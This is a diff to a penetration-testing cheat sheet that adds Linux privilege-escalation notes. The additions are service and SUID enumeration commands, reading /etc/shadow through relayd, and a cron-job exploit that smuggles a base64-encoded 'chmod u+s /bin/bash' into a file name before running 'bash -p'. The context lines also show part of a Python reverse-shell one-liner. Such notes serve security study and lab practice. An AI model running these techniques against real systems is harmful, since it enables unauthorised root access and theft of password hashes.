@@ -162,6 +162,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [NFS](#nfs)
     - [Kernel Exploits](#kernel-exploits)
     - [find with exec](#find-with-exec)
+    - [find PE](#find-pe)
     - [Abusing capabilities](#abusing-capabilities)
     - [Escape shell](#escape-shell)
     - [Docker](#docker)
@@ -4028,6 +4029,21 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
   - On Debian like systems, run ` dpkg -l | grep <program>`
   - On systems that use rpm, run `rpm –qa | grep <program>`
 
+**Check services running on localhost**
+- `netstat -tlpn`
+- `ss -antp`
+- `ps -auxwf`
+
+**Check which services run as root**
+- ```
+  find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
+  ps -aux | grep root | grep sql
+  ss -antp
+  ```
+- note: if you find `relayd`
+  - `/usr/sbin/relayd -C /etc/shadow`
+  - now you can read `/etc/shadow`
+
 **MySQL service running as root with no password assigned**
 - Run `mysqld --version`
 - One great exploit is the following: [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
@@ -4305,6 +4321,20 @@ Run:
 - Also known as "Abusing Setuid Binaries"
 - `find /home/username/Desktop -exec "/usr/bin/bash" -p \;`
 - See more here: [find | GTFOBins](https://gtfobins.github.io/gtfobins/find/)
+
+#### <ins>find PE</ins>
+
+- Example cron job running clean-tmp.sh:
+  ```
+  jane@assignment:~$ cat /usr/bin/clean-tmp.sh 
+  #! /bin/bash
+  find /dev/shm -type f -exec sh -c 'rm {}' \;
+  ```
+  - Exploit:
+    ```
+    jane@assignment:~$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
+    jane@assignment:~$ bash -p
+    ```
 
 #### <ins>Abusing capabilities</ins>
 - `/usr/sbin/getcap -r / 2>/dev/null` enumerate capabilities
